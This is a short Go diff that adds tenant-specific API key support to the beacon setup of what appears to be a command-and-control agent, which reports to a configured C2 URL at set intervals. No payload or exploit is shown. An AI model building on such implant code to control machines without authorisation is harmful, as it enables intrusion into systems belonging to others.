@@ -91,7 +91,13 @@ func main() {
 	}
 
 	// Setup beacon
-	beaconClient := beacon.New(cfg.AgentID, cfg.C2URL, cfg.BeaconInterval, httpClient.C2Client)
+	var beaconClient *beacon.Beacon
+	if cfg.TenantAPIKey != "" {
+		log.Printf("Using tenant-specific API key for beacon")
+		beaconClient = beacon.NewWithTenant(cfg.AgentID, cfg.C2URL, cfg.TenantAPIKey, cfg.BeaconInterval, httpClient.C2Client)
+	} else {
+		beaconClient = beacon.New(cfg.AgentID, cfg.C2URL, cfg.BeaconInterval, httpClient.C2Client)
+	}
 	
 	// Print system info
 	sysInfo := system.GetBasicInfo()
